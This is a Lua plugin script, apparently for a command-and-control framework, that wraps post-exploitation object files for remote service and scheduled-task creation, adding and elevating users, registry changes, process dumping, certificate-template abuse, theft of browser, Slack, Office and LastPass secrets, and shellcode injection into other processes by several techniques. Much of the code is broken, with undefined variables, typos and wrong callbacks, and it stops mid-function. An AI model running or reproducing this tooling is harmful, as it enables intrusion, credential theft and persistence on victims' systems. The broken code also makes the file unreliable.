local remote = {}
remote.bof_dir = ""

-- Registry hives and types
local reghives = {HKCR = 0, HKCU = 1, HKLM = 2, HKU = 3}

local regtypes = {
    REG_SZ = 1,
    REG_EXPAND_SZ = 2,
    REG_BINARY = 3,
    REG_DWORD = 4,
    REG_MULTI_SZ = 7,
    REG_QWORD = 11
}

local inttypes = {REG_DWORD = 1, REG_QWORD = 1}

local servicetypes = {[1] = 0x02, [2] = 0x01, [3] = 0x10, [4] = 0x20}

local id_lastpass = "LASTPASS>>"

local function random_string(limit)
    local characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    local random_str = {}
    for _ = 1, limit do
        local n = math.random(#characters)
        table.insert(random_str, characters:sub(n, n))
    end
    return table.concat(random_str)
end

local function ops(args)
    local arguments = {}
    for i, arg in ipairs(args) do
        if i > 1 then
            if arg:match(".+:.*") then
                local key, val = arg:match("(.+):(.+)")
                arguments[key] = val
            elseif arg:match(".+") then
                arguments[arg] = "TRUE"
            else
                arguments[tostring(i)] = arg
            end
        end
    end
    return arguments
end

-- sc_create
-- example: `remote sc_create ANewService "A New Service" "C:\Users\root123\Desktop\cloudsword.exe" "This is a new service description" 1 2 3 "MyComputer"`
function remote.parse_sc_create(args)
    if #args < 6 then
        error(
            "Need to provide the remote sc_create <servicename> <displayname> <binarypath> <description> <errormode> <startmode> [servicetype] [hostname]")
    end
    local servicename = args[1]
    local displayname = args[2]
    local binpath = args[3]
    local desc = args[4]
    local errormode = tonumber(args[5])
    local startmode = tonumber(args[6])
    local servicetype = servicetypes[args[7]] or servicetypes[3] -- Default to 3 if not specified
    print(servicetype)
    local hostname = args[8] or ""
    if errormode < 0 or errormode > 3 then
        error("Error mode must be between 0 and 3")
    end
    if startmode < 2 or startmode > 4 then
        error("Start mode must be between 2 and 4")
    end
    return bof_pack("zzzzzsss", hostname, servicename, binpath, displayname,
                    desc, errormode, startmode)
end
function remote.run_sc_create(args)
    local session = active()
    local packed_args = remote.parse_sc_create(args)
    local bof_path = "RemoteOPsBOF/Remote/sc_create/sc_create" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:sc_create", remote.run_sc_create,
        "remote sc_create <servicename> <displayname> <binarypath> <description> <errormode> <startmode> [servicetype] [hostname]",
        "")

-- sc_delete
function remote.parse_sc_delete(args)
    if #args < 1 then error("Need to provide the service name at a minimum") end
    local servicename = args[1]
    local hostname = args[2] or ""
    return bof_pack("zz", hostname, servicename)
end
function remote.run_sc_delete(args)
    local packed_args = remote.parse_sc_delete(args)
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/sc_delete/sc_delete" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:sc_delete", remote.run_sc_delete,
        "remote sc_delete <servicename> [hostname]", "")

-- Service Control functions
-- Example: `remote sc_description MyExistingService "This is a new service description"`
function remote.parse_sc_description(args)
    if #args < 2 then
        error(
            "Need to provide the remote sc_description <servicename> <description> <hostname(not required)>")
    end

    local servicename = args[1]
    local desc = args[2] or ""
    local hostname = args[3] or ""
    return bof_pack("zzz", hostname, servicename, desc)
end
function remote.run_sc_description(args)
    args = remote.parse_sc_description(args)
    local session = active()
    local bof_path =
        "RemoteOPsBOF/Remote/sc_description/sc_description" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("remote:sc_description", remote.run_sc_description,
        "remote sc_description <servicename> <description> <hostname(not required)>",
        "")

-- sc_config
-- example: `remote sc_config MyExistingService "C:\Users\Admin\Desktop\service.exe" 1 2`
function remote.parse_sc_config(args)
    if #args < 4 or #args > 5 then
        error(
            "Need to provide the remote sc_config <servicename> <binarypath> <errormode> <startmode> <hostname(not required)>")
    end
    local servicename = args[1]
    local binpath = args[2]
    local errormode = tonumber(args[3])
    local startmode = tonumber(args[4])
    local hostname = args[5] or ""
    if errormode < 0 or errormode > 3 then
        error("Error mode must be between 0 and 3")
    end
    if startmode < 2 or startmode > 4 then
        error("Start mode must be between 2 and 4")
    end
    return bof_pack("zzzss", hostname, servicename, binpath, errormode,
                    startmode)
end
function remote.run_sc_config(args)
    args = remote.parse_sc_config(args)
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/sc_config/sc_config" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("remote:sc_config", remote.run_sc_config,
        "remote sc_config <servicename> <binarypath> <errormode> <startmode> [hostname]",
        "")

-- sc_failure
-- example: `remote sc_failure MyExistingService 10 "Rebooting..." "shutdown /r /t 10" 1 "10"`
function remote.parse_sc_failure(args)
    if #args < 6 then
        error(
            "Need to provide the <servicename> <resetperiod> <rebootmessage> <command> <numactions> <actions> <hostname(not required)>")
    end
    local servicename = args[1]
    local resetperiod = args[2]
    local rebootmessage = args[3]
    local command = args[4]
    local numactions = args[5]
    local actions = args[6]
    local hostname = args[7] or ""
    return bof_pack("zzizzsz", hostname, servicename, resetperiod,
                    rebootmessage, command, numactions, actions)
end
function remote.run_sc_failure(args)
    args = parse_sc_failure(args)
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/sc_failure/sc_failure" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("remote:sc_failure", remote.run_sc_failure,
        "remote sc_failure <servicename> <resetperiod> <rebootmessage> <command> <numactions> <actions> <hostname(not required)>",
        "")

-- sc_stop
function remote.run_sc_stop(args)
    if #args < 1 then error("Need to provide the service name at a minimum") end
    local servicename = args[1]
    local hostname = args[2] or ""
    local session = active()
    local packed_args = bof_pack("zz", hostname, servicename)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:sc_stop", remote.run_sc_stop,
        "remote sc_stop <servicename> [hostname]", "")
-- sc_start
function remote.run_sc_start(args)
    if #args < 1 then error("Need to provide the service name at a minimum") end
    local servicename = args[1]
    local hostname = args[2] or ""
    local session = active()

    local packed_args = bof_pack("zz", hostname, servicename)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:sc_start", remote.run_sc_start,
        "remote sc_start <servicename> [hostname]", "")

-- Process Control functions
-- procdump
function remote.run_procdump(args)
    if #args ~= 2 then
        error("Need to provide the process ID and file path at a minimum")
    end
    local pid = args[1]
    local fileout = args[2]
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/procdump/procdump" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("iZ", pid, fileout)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:procdump", remote.run_procdump,
        "remote procdump <pid> <fileout>", "")
-- ProcessListHandles
function remote.run_ProcessListHandles(args)
    if #args < 1 then error("Need to provide the process ID at a minimum") end
    local pid = args[1]
    local session = active()
    local bof_path =
        "RemoteOPsBOF/Remote/ProcessListHandles/ProcessListHandles" .. "." ..
            session.Os.Arch .. ".o"
    local packed_args = bof_pack("i", pid)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:ProcessListHandles", remote.run_ProcessListHandles,
        "remote ProcessListHandles <pid>", "")
-- ProcessDestroy
function remote.run_ProcessDestroy(args)
    if #args < 1 then error("Need to provide the process ID at a minimum") end
    local pid = args[1]
    local handleid = args[2] or "0"
    local session = active()
    local packed_args = bof_pack("ii", pid, handleid)
    local bof_path =
        "RemoteOPsBOF/Remote/ProcessDestroy/ProcessDestroy" .. "." ..
            session.Os.Arch .. ".o"
end
command("remote:ProcessDestroy", remote.run_ProcessDestroy,
        "remote ProcessDestroy <pid> [handleid]", "")

-- User account functions
function remote.run_enableuser(args)
    if #args < 2 then
        error("Need to provide the username and domain at a minimum")
    end
    local username = args[1]
    local domain = args[2]
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/enableuser/enableuser" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("ZZ", domain, username)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:enableuser", remote.run_enableuser,
        "remote enableuser <username> <domain>", "")

function remote.run_setuserpass(args)
    local username = args[1]
    local password = args[2]
    local domain = args[3]
    if not username or not password or not domain then
        error("Missing required parameters for setuserpass")
    end
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/setuserpass/setuserpass" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("ZZZ", domain, username, password)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:setuserpass", remote.run_setuserpass,
        "remote setuserpass <username> <password> <domain>", "")

function remote.run_addusertogroup(args)
    local username = args[1]
    local groupname = args[2]
    local server = args[3]
    local domain = args[4]
    if not username or not groupname or not server or not domain then
        error("Missing required parameters for addusertogroup")
    end
    local session = active()
    local packed_args = bof_pack("ZZZZ", domain, server, username, groupname)
    local bof_path =
        "RemoteOPsBOF/Remote/addusertogroup/addusertogroup" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:addusertogroup", remote.run_addusertogroup,
        "remote addusertogroup <username> <groupname> <server> <domain>", "")

function remote.run_adduser(args)
    local username = args[1]
    local password = args[2]
    local server = args[3] or ""
    local session = active()

    if not username or not password then
        error("Missing required parameters for adduser")
    end
    local bof_path = "RemoteOPsBOF/Remote/adduser/adduser" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("ZZZ", username, password, server)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:adduser", remote.run_adduser,
        "remote adduser <username> <password> [server]", "")

function remote.run_unexpireuser(args)
    local username = args[1]
    local domain = args[2]
    local session = active()

    if not username or not domain then
        error("Missing required parameters for unexpireuser")
    end
    local bof_path = "RemoteOPsBOF/Remote/unexpireuser/unexpireuser" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("ZZ", domain, username)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:unexpireuser", remote.run_unexpireuser,
        "remote unexpireuser <username> <domain>", "")

-- Registry functions
function remote.run_reg_set(args)
    if #args < 5 then error("Insufficient arguments for reg_set") end
    local hostname = ""
    local hive = reghives[args[1]]
    local path = args[2]
    local key = args[3]
    local reg_type = regtypes[args[4]]
    local value = args[5]
    if reg_type == nil then error("Invalid registry type provided") end
    local packed_value = nil
    if inttypes[args[4]] then
        packed_value = pack("I", value)
    else
        packed_value = value
    end
    local bof_path = "RemoteOPsBOF/Remote/reg_set/reg_set" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("zizzi", hostname, hive, path, key, reg_type,
                                 packed_value)
    local session = active()
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:reg_set", remote.run_reg_set,
        "remote reg_set <hive> <path> <key> <reg_type> <value>", "")

function remote.run_reg_delete(args)
    local hostname = ""
    local hive = reghives[args[1]]
    local path = args[2]
    local key = args[3] or ""
    local delkey = (args[3] == nil)
    local session = active()

    if #args < 2 then error("Insufficient arguments for reg_delete") end

    if not hive then error("Invalid hive provided") end
    local bof_path = "RemoteOPsBOF/Remote/reg_delete/reg_delete" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("zizzi", hostname, hive, path, key, delkey)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:reg_delete", remote.run_reg_delete,
        "remote reg_delete <hive> <path> [key]", "")

function remote.run_reg_save(args)
    local hive = reghives[args[1]]
    local regpath = args[2]
    local output = args[3]
    local session = active()

    if not hive or not regpath or not output then
        error("Missing required parameters for reg_save")
    end
    print("Requesting to backup privileges")
    bgetprivs(session, "SeBackupPrivilege")

    local packed_args = bof_pack("zzi", regpath, output, hive)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:reg_save", remote.run_reg_save,
        "remote reg_save <hive> <regpath> <output>", "")

-- sctaskscreate functions
function remote.run_schtaskscreate(args)
    if #args < 5 then
        error("u need to provide the server, taskpath, mode, force, and file ")
    end
    local server = args[1] or ""
    local taskpath = args[2]
    local mode = args[3]
    local force = args[4] == "UPDATE" and 1 or 0
    local filename = args[5]
    local session = active()
    local mode_map = {USER = 0, SYSTEM = 1, XML = 2}
    local file_content = read(filename)

    local packed_args = bof_pack("ZZZii", server, taskpath, file_content,
                                 mode_map[mode], force)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:schtaskscreate", remote.run_schtaskscreate,
        "remote schtaskscreate [server] <taskpath> <mode> <force> <file_path>",
        "")

-- sctasksdelete functions
function remote.run_schtasksdelete(args)
    local server = args[1] or ""
    local taskname = args[2]
    local isfolder = args[3] == "FOLDER" and 1 or 0
    local session = active()

    if not taskname then
        error("Missing required parameters for schtasksdelete")
    end

    local packed_args = bof_pack("ZZi", server, taskname, isfolder)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:schtasksdelete", remote.run_schtasksdelete,
        "remote schtasksdelete [server] <taskname> [FOLDER]", "")

function remote.run_schtasksstop(args)
    local server = args[1] or ""
    local taskname = args[2]
    local session = active()

    if not taskname then
        error("Missing required parameters for schtasksstop")
    end

    local packed_args = bof_pack("ZZ", server, taskname)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:schtasksstop", remote.run_schtasksstop,
        "remote schtasksstop [server] <taskname>", "")

function remote.run_schtasksrun(args)
    local server = args[1] or ""
    local taskname = args[2]
    local session = active()

    if not taskname then error("Missing required parameters for schtasksrun") end

    local packed_args = bof_pack("ZZ", server, taskname)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:schtasksrun", remote.run_schtasksrun,
        "remote schtasksrun [server] <taskname>", "")

function remote.run_chromeKey()
    local session = active()
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:chromeKey", remote.run_chromeKey, "remote chromeKey", "")

function remote.run_slackKey()
    local session = active()
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:slackKey", remote.run_slackKey, "remote slackKey", "")

function remote.run_slack_cookie(args)
    local pid = args[1]
    local session = active()

    if not pid then error("Missing required parameters for slack_cookie") end

    local packed_args = bof_pack("i", pid)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:slack_cookie", remote.run_slack_cookie,
        "remote slack_cookie <pid>", "")

-- run_shspawnas
function remote.run_shspawnas(args)
    local bid = args[1]
    local domain = args[2]
    local username = args[3]
    local pass = args[4]
    local shellcodepath = args[5]
    local session = active()

    if not domain or not username or not pass then
        error("Incorrect argument count")
    end

    if not shellcodepath then error("No shellcode file selected") end

    local shellcode = read(shellcodepath)

    local user = binfo(bid, "user")
    if user == "SYSTEM *" or user == "SYSTEM" then
        error("This function will not function properly as the system user")
    end

    local packed_args = bof_pack(bid, "ZZZb", domain, username, pass, shellcode)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:shspawnas", remote.run_shspawnas,
        "remote shspawnas <bid> <domain> <username> <password> <shellcodepath>",
        "")

-- adcs_request
function remote.parse_adcs_request(args)
    if #args < 1 then
        error("Need to provide the Certificate Authority (CA) at a minimum")
    end
    local adcs_request_ca = args[1]
    local adcs_request_template = args[2] or ""
    local adcs_request_subject = args[3] or ""
    local adcs_request_altname = args[4] or ""
    local adcs_request_install = args[5] or "0"
    local adcs_request_machine = args[6] or "0"
    local app_policy = args[7] or "0"

    return bof_pack("ZZZZsss", adcs_request_ca, adcs_request_template,
                    adcs_request_subject, adcs_request_altname,
                    adcs_request_install, adcs_request_machine, app_policy)
end
function remote.run_adcs_request(args)
    args = remote.parse_adcs_request(args)
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/adcs_request/adcs_request" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), args, true)
end
command("remote:adcs_request", remote.run_adcs_request,
        "remote adcs_request CA [opt:TEMPLATE] [opt:SUBJECT] [opt: ALTNAME] [opt: INSTALL] [opt:MACHINE]",
        "")

-- adcs_request_on_behalf
function remote.run_adcs_request_on_behalf(args)
    local bid = args[1]
    local template = args[2]
    local requester = args[3]
    local pfx_path = args[4]
    local download_name = args[5]
    local session = active()

    if not template or not requester or not pfx_path or not download_name then
        error(
            "Need to provide TEMPLATE, REQUESTER, ENROLLMENT_AGENT.pfx, and Download_Name")
    end

    local enrollpfx = read(pfx_path)
    local packed_args = bof_pack(bid, "ZZzb", template, requester,
                                 download_name, enrollpfx)

    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:adcs_request_on_behalf", remote.run_adcs_request_on_behalf,
        "remote adcs_request_on_behalf <bid> <template> <requester> <pfx_path> <download_name>",
        "")

-- office_tokens
function remote.run_office_tokens(args)
    local bid = args[1]
    local pid = args[2]
    local session = active()
    if not pid then error("Usage: office_tokens <pid>") end
    local bof_path = "RemoteOPsBOF/Remote/office_tokens/office_tokens" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack(bid, "i", pid)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:office_tokens", remote.run_office_tokens,
        "remote office_tokens <bid> <pid>", "")

-- lastpass todo
function remote.run_lastpass(args)
    local pids = args
    local session = active()

    if #pids < 1 then error("Usage: lastpass <pid1> <pid2> <pid3> ...") end

    local buffer = ""
    for _, pid in ipairs(pids) do buffer = buffer .. pack_bof("i", pid) end

    local arg_sz = #pids
    local bof_path = "RemoteOPsBOF/Remote/lastpass/lastpass" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack(bid, "ib", arg_sz, buffer)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:lastpass", remote.run_lastpass,
        "remote lastpass <bid> <pid1> <pid2> <pid3> ...", "")

function remote.run_suspend(args)
    local pid = args[1]
    local session = active()

    if not pid then error("Missing required parameters for suspend") end
    local bof_path = "RemoteOPsBOF/Remote/suspend/suspend" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("si", 1, pid)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:suspend", remote.run_suspend, "remote suspend <pid>", "")
-- remote resume
function remote.run_resume(args)
    local pid = args[1]
    local session = active()

    if not pid then error("Missing required parameters for resume") end
    local bof_path = "RemoteOPsBOF/Remote/resume/resume" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("si", 0, pid)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:resume", remote.run_resume, "remote resume <pid>", "")

function remote.run_get_priv(args)
    local priv_name = args[1]
    local session = active()

    if not priv_name then error("Missing required parameters for get_priv") end
    local bof_path = "RemoteOPsBOF/Remote/get_priv/get_priv" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("z", priv_name)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:get_priv", remote.run_get_priv, "remote get_priv <priv_name>",
        "")

function remote.run_ghost_task(args)
    local bid = args[1]
    local hostname = string.lower(args[2] or "")
    local operation = string.lower(args[3] or "")
    local arglen = #args
    local taskname, program, argument, username, scheduletype, time, day
    local packed_args
    local session = active()

    if arglen < 2 then
        error(
            "No computer name (e.g., localhost/remote server hostname) provided.")
    elseif arglen < 3 then
        error("No reg task operation (e.g., add/delete) provided.")
    end

    if operation == "add" then
        if arglen < 8 then
            error(
                "Insufficient arguments for adding a task. Refer to command details.")
        end

        taskname = string.lower(args[4])
        program = string.lower(args[5])
        argument = string.lower(args[6])
        username = string.lower(args[7])
        scheduletype = string.lower(args[8])

        if scheduletype == "weekly" then
            time = string.lower(args[9])
            day = string.lower(args[10])
            packed_args = bof_pack(bid, "izzzzzzzzz", arglen, hostname,
                                   operation, taskname, program, argument,
                                   username, scheduletype, time, day)
        elseif scheduletype == "second" or scheduletype == "daily" then
            time = string.lower(args[9])
            packed_args = bof_pack(bid, "izzzzzzzz", arglen, hostname,
                                   operation, taskname, program, argument,
                                   username, scheduletype, time)
        elseif scheduletype == "logon" then
            packed_args = bof_pack(bid, "izzzzzzz", arglen, hostname, operation,
                                   taskname, program, argument, username,
                                   scheduletype)
        else
            error("Unknown schedule type: " .. scheduletype)
        end
    elseif operation == "delete" then
        if arglen < 4 then
            error(
                "Insufficient arguments for deleting a task. Refer to command details.")
        end
        taskname = string.lower(args[4])
        packed_args = bof_pack(bid, "izzz", arglen, hostname, operation,
                               taskname)
    else
        error("Unknown operation: " .. operation)
    end
    local bof_path = "RemoteOPsBOF/Remote/ghost_task/ghost_task" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:ghost_task", remote.run_ghost_task,
        "remote ghost_task <bid> <hostname> <operation> [taskname] [program] [argument] [username] [scheduletype] [time] [day]",
        "")

function remote.run_shutdown(args)
    local hostname = args[1] or ""
    local message = args[2] or ""
    local time = tonumber(args[3])
    local close_apps = tonumber(args[4])
    local reboot = tonumber(args[5])
    local session = active()

    if not time or close_apps == nil or reboot == nil then
        error("Missing required parameters for shutdown")
    end

    if close_apps ~= 0 and close_apps ~= 1 then
        error("Invalid close_apps parameter")
    end
    if reboot ~= 0 and reboot ~= 1 then error("Invalid reboot parameter") end
    local bof_path = "RemoteOPsBOF/Remote/shutdown/shutdown" .. "." ..
                         session.Os.Arch .. ".o"
    local packed_args = bof_pack("zziss", hostname, message, time, close_apps,
                                 reboot)
    return bof(session, script_resource(bof_path), packed_args, true)
end
command("remote:shutdown", remote.run_shutdown,
        "remote shutdown [hostname] [message] <time> <close_apps> <reboot>", "")

function remote.run_global_unprotect()
    local session = active()
    local bof_path = "RemoteOPsBOF/Remote/global_unprotect/global_unprotect" ..
                         "." .. session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), {}, true)
end
command("remote:global_unprotect", remote.run_global_unprotect,
        "remote global_unprotect", "")

-- Inject
function remote.createremotethread(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    localpack_args = bof_pack("ib", pid, shellcode)
    local bof_path =
        "RemoteOPsBOF/Inject/createremotethread/createremotethread" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local createremotethread_command = command("remote:createremotethread",
                                           remote.run_global_unprotect,
                                           "remote createremotethread", "")
createremotethread_command:Flags():Int64("pid", 0,
                                         "the process id to inject into")
createremotethread_command:Flags():String("shellcode_file", "",
                                          "the shellcode file to inject")

local function run_setthreadcontext(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/setthreadcontext/setthreadcontext" ..
                         "." .. session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_setthreadcontext = command("remote:setthreadcontext",
                                         run_setthreadcontext,
                                         "remote setthreadcontext --pid <pid> --shellcode_file <path2shellcode.bin>",
                                         "")
command_setthreadcontext:Flags()
    :Int64("pid", 0, "the process id to inject into")
command_setthreadcontext:Flags():String("shellcode_file", "",
                                        "the shellcode file to inject")

local function run_ntcreatethread(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path =
        "RemoteOPsBOF/Inject/ntcreatethread/ntcreatethread" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end

local command_ntcreatethread = command("remote:ntcreatethread",
                                       run_ntcreatethread,
                                       "remote ntcreatethread --pid <pid> --shellcode_file <path2shellcode.bin>",
                                       "")
command_ntcreatethread:Flags():Int64("pid", 0, "the process id to inject into")
command_ntcreatethread:Flags():String("shellcode_file", "",
                                      "the shellcode file to inject")

local function run_ntqueueapcthread(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/ntqueueapcthread/ntqueueapcthread" ..
                         "." .. session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end

local command_ntqueueapcthread = command("remote:ntqueueapcthread",
                                         run_ntqueueapcthread,
                                         "remote ntqueueapcthread --pid <pid> --shellcode_file <path2shellcode.bin>",
                                         "")
command_ntqueueapcthread:Flags()
    :Int64("pid", 0, "the process id to inject into")
command_ntqueueapcthread:Flags():String("shellcode_file", "",
                                        "the shellcode file to inject")

local function run_kernelcallbacktable(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path =
        "RemoteOPsBOF/Inject/kernelcallbacktable/kernelcallbacktable" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end

local command_kernelcallbacktable = command("remote:kernelcallbacktable",
                                            run_kernelcallbacktable,
                                            "remote kernelcallbacktable --pid <pid> --shellcode_file <path2shellcode.bin>",
                                            "")
command_kernelcallbacktable:Flags():Int64("pid", 0,
                                          "the process id to inject into")
command_kernelcallbacktable:Flags():String("shellcode_file", "",
                                           "the shellcode file to inject")

local function run_tooltip(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/tooltip/tooltip" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end

local command_tooltip = command("remote:tooltip", run_tooltip,
                                "remote tooltip --pid <pid> --shellcode_file <path2shellcode.bin>",
                                "")
command_tooltip:Flags():Int64("pid", 0, "the process id to inject into")
command_tooltip:Flags():String("shellcode_file", "",
                               "the shellcode file to inject")

local function run_uxsubclassinfo(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path =
        "RemoteOPsBOF/Inject/uxsubclassinfo/uxsubclassinfo" .. "." ..
            session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end

local command_uxsubclassinfo = command("remote:uxsubclassinfo",
                                       run_uxsubclassinfo,
                                       "remote uxsubclassinfo --pid <pid> --shellcode_file <path2shellcode.bin>",
                                       "")
command_uxsubclassinfo:Flags():Int64("pid", 0, "the process id to inject into")
command_uxsubclassinfo:Flags():String("shellcode_file", "",
                                      "the shellcode file to inject")

-- clipboardinject
local function run_clipboardinject(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/clipboardinject/clipboardinject" ..
                         "." .. session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_clipboardinject = command("remote:clipboardinject",
                                        run_clipboardinject,
                                        "remote clipboardinject --pid <pid> --shellcode_file <path2shellcode.bin>",
                                        "")
command_clipboardinject:Flags():Int64("pid", 0, "the process id to inject into")
command_clipboardinject:Flags():String("shellcode_file", "",
                                       "the shellcode file to inject")
-- conhost
local function run_conhost(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
